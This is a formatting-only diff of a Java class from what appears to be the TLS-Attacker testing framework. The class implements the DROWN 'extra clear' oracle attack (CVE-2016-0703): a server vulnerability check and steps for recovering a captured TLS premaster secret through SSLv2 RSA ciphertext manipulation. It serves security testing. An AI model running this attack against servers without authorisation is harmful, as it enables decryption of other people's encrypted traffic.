@@ -6,6 +6,7 @@
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
+
 package de.rub.nds.tlsattacker.attacks.impl.drown;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
@@ -68,8 +69,8 @@ class ExtraClearAttack {
     }
 
     /**
-     * Checks if an arbitrary number of clear-text bytes can be included in the handshake. This bug is known as
-     * "extra clear" oracle (CVE-2016-0703). It can even work for non-export ciphers.
+     * Checks if an arbitrary number of clear-text bytes can be included in the handshake. This bug is known as "extra
+     * clear" oracle (CVE-2016-0703). It can even work for non-export ciphers.
      *
      * @return Indication whether the server is vulnerable to the "extra clear" oracle attack
      */
@@ -83,9 +84,8 @@ class ExtraClearAttack {
         SSL2ClientMasterKeyMessage clientMasterKeyMessage = new SSL2ClientMasterKeyMessage();
         clientMasterKeyMessage.setClearKeyData(clearKeyData);
 
-        WorkflowTrace trace =
-            new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.SSL2_HELLO,
-                RunningModeType.CLIENT);
+        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
+            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
         trace.addTlsAction(new SendAction(clientMasterKeyMessage));
         trace.addTlsAction(new ReceiveAction(new SSL2ServerVerifyMessage()));
         State state = new State(tlsConfig, trace);
@@ -98,11 +98,11 @@ class ExtraClearAttack {
             return DrownVulnerabilityType.NONE;
         }
 
-        SSL2ServerVerifyMessage serverVerifyMessage =
-            (SSL2ServerVerifyMessage) WorkflowTraceUtil.getFirstReceivedMessage(
-                HandshakeMessageType.SSL2_SERVER_VERIFY, trace);
+        SSL2ServerVerifyMessage serverVerifyMessage = (SSL2ServerVerifyMessage) WorkflowTraceUtil
+            .getFirstReceivedMessage(HandshakeMessageType.SSL2_SERVER_VERIFY, trace);
 
-        if (serverVerifyMessage != null && ServerVerifyChecker.check(serverVerifyMessage, state.getTlsContext(), true)) {
+        if (serverVerifyMessage != null
+            && ServerVerifyChecker.check(serverVerifyMessage, state.getTlsContext(), true)) {
             return DrownVulnerabilityType.SPECIAL;
         }
 
@@ -145,9 +145,8 @@ class ExtraClearAttack {
 
     private void initRsaParams() {
         // Do minimal SSLv2 handshake
-        WorkflowTrace trace =
-            new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.SSL2_HELLO,
-                RunningModeType.CLIENT);
+        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
+            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
         State state = new State(tlsConfig, trace);
         WorkflowExecutor workflowExecutor =
             WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
@@ -168,10 +167,10 @@ class ExtraClearAttack {
      * Step (1) of the attack according to section 5.2.1 of the DROWN paper: Try to convert a TLS Premaster secret to
      * SSLv2 ENCRYPTED-KEY-DATA. (Details and nomenclature given in section 3.2.1.)
      *
-     * @param premasterSecret
-     * A captured TLS Premaster secret
-     * @return The Premaster secret converted to ENCRYPTED-KEY-DATA, or null if no conversion succeeded within the given
-     * limits
+     * @param  premasterSecret
+     *                         A captured TLS Premaster secret
+     * @return                 The Premaster secret converted to ENCRYPTED-KEY-DATA, or null if no conversion succeeded
+     *                         within the given limits
      */
     private byte[] step1(byte[] premasterSecret) {
         BigInteger c0 = new BigInteger(premasterSecret);
@@ -209,9 +208,9 @@ class ExtraClearAttack {
      * in section 5.1 but omitted in section 5.2.1. (Details and nomenclature for the rotations given in section 3.2.2
      * and appendix A.3.)
      *
-     * @param c1
-     * (Encrypted) TLS Premaster secret converted to SSLv2 ENCRYPTED-KEY-DATA
-     * @return The cleartext for c1, or null if an error occurred
+     * @param  c1
+     *            (Encrypted) TLS Premaster secret converted to SSLv2 ENCRYPTED-KEY-DATA
+     * @return    The cleartext for c1, or null if an error occurred
      */
     private byte[] step2(byte[] c1) {
         SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
@@ -264,9 +263,8 @@ class ExtraClearAttack {
 
             for (int i = 0; i < threadNumber; i++) {
                 BigInteger initialSCandidate = BigInteger.valueOf(1 + i * 2);
-                ExtraClearStep2Callable callable =
-                    new ExtraClearStep2Callable(oracle, ciphertext, lenN, rsaE, modulus, initialSCandidate,
-                        candidateStepS, knownPlaintext);
+                ExtraClearStep2Callable callable = new ExtraClearStep2Callable(oracle, ciphertext, lenN, rsaE, modulus,
+                    initialSCandidate, candidateStepS, knownPlaintext);
                 allCallables.add(callable);
                 allFutures.add(completionService.submit(callable));
             }
@@ -293,9 +291,8 @@ class ExtraClearAttack {
                 return null;
             }
 
-            byte[] multipliedCiphertext =
-                ArrayConverter.bigIntegerToByteArray(
-                    s.modPow(rsaE, modulus).multiply(new BigInteger(ciphertext)).mod(modulus), lenN, true);
+            byte[] multipliedCiphertext = ArrayConverter.bigIntegerToByteArray(
+                s.modPow(rsaE, modulus).multiply(new BigInteger(ciphertext)).mod(modulus), lenN, true);
             // Called mk_secret in the DROWN paper
             byte[] multipliedNewPlaintext = recoverPlaintext(multipliedCiphertext);
 
@@ -307,9 +304,8 @@ class ExtraClearAttack {
             // If everything else works alright, s should always have an
             // inverse under byteModulo
             BigInteger inverseS = s.modInverse(byteModulo);
-            BigInteger b =
-                new BigInteger(ensurePositive(multipliedNewPlaintext)).add(numOfSubstractions.multiply(modulus).mod(
-                    byteModulo));
+            BigInteger b = new BigInteger(ensurePositive(multipliedNewPlaintext))
+                .add(numOfSubstractions.multiply(modulus).mod(byteModulo));
             BigInteger computedPlainLastBytes = b.multiply(inverseS).mod(byteModulo);
 
             // Update known plaintext
@@ -335,9 +331,9 @@ class ExtraClearAttack {
      * Step (3) of the attack according to section 5.2.1 of the DROWN paper: Convert decrypted SSLv2 SECRET-KEY-DATA
      * back to TLS Premaster secret.
      *
-     * @param m1
-     * (Plaintext) SSLv2 SECRET-KEY-DATA
-     * @return m1 converted back to a TLS Premaster secret
+     * @param  m1
+     *            (Plaintext) SSLv2 SECRET-KEY-DATA
+     * @return    m1 converted back to a TLS Premaster secret
      */
     private byte[] step3(byte[] m1) {
         BigInteger modulus = serverModulus;
@@ -352,9 +348,9 @@ class ExtraClearAttack {
      * Determines SECRET-KEY-DATA, i.e. the actual plaintext value of ENCRYPTED-KEY-DATA, after conversion of TLS
      * Premaster secret to ENCRYPTED-KEY-DATA. The process is extensively described in section 5.1 of the DROWN paper.
      *
-     * @param encryptedKeyData
-     * An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
-     * @return Recovered SECRET-KEY-DATA, i.e. the plaintext value of `encryptedKeyData`
+     * @param  encryptedKeyData
+     *                          An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
+     * @return                  Recovered SECRET-KEY-DATA, i.e. the plaintext value of `encryptedKeyData`
      */
     private byte[] recoverPlaintext(byte[] encryptedKeyData) {
         SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
@@ -378,11 +374,11 @@ class ExtraClearAttack {
     /**
      * Updates the currently known plaintext part with some new known bytes.
      *
-     * @param oldPlaintext
-     * Previously known plaintext
-     * @param newBytes
-     * New plaintext bytes
-     * @return New known plaintext
+     * @param  oldPlaintext
+     *                      Previously known plaintext
+     * @param  newBytes
+     *                      New plaintext bytes
+     * @return              New known plaintext
      */
     private static BigInteger updateKnownPlaintext(BigInteger oldPlaintext, byte[] newBytes) {
         byte[] plainBytes = ensurePositive(oldPlaintext.toByteArray());
@@ -395,9 +391,9 @@ class ExtraClearAttack {
      * Makes sure that a byte array does not represent a negative number when creating a BigInteger from it. Will
      * increase the array's length by 1.
      *
-     * @param data
-     * Array to work on
-     * @return Copy of "data", with an additional leading zero
+     * @param  data
+     *              Array to work on
+     * @return      Copy of "data", with an additional leading zero
      */
     protected static byte[] ensurePositive(byte[] data) {
         byte[] positiveData = new byte[data.length + 1];
